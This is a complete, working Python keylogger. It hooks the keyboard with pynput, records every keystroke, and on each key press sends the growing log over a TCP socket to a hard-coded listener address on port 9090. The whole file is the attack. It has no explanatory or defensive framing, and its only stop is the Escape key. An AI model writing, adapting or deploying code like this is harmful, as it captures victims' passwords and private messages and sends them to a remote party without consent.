import socket
import pynput.keyboard

# Define the target IP and port for the listener
target_ip = "192.168.189.191"
target_port = 9090

# Function to send data to listener
def send_data(data):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect to the listener
        s.connect((target_ip, target_port))
        # Send the data
        s.send(data.encode())
        # Close the socket
        s.close()
    except Exception as e:
        print("Error:", e)
# Keylogger class to capture keystrokes
class Keylogger:
    def __init__(self):
        self.log = ""

    # Function to append key to log
    def append_to_log(self, key):
        self.log += str(key)
        send_data(self.log)
    
    # Function called on key press
    def on_press(self, key):
        try:
            self.append_to_log(key.char)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                self.append_to_log(" ")
            else:
                self.append_to_log(" " + str(key) + " ")

    # Function called when key is released
    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            return False

    # Function to start the keylogger
    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

# Instantiate and start the keylogger
keylogger = Keylogger()
keylogger.start()


